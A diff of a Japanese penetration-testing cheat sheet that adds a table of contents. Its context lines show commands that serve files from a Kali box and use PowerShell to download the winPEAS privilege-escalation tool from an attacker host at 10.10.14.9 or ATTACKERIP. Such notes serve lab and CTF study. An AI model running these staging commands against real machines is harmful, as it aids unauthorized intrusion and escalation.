@@ -1,4 +1,7 @@
 # tips
+# 目次
+[🔴nmap](#-nmap)
+[🔵tools](#-tools)
 
 ## 🔴nmap
 ## 🔴hosts設定
@@ -281,8 +284,6 @@ python3 -m http.server 80  # Kali側
 
 powershell　wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
 powershell -Command "Invoke-WebRequest -Uri http://ATTACKERIP/winPEASx64.exe -OutFile winpeas.exe"
-
-
 ```
 #### 2. 実行（PowerShellまたはcmd）
 ```
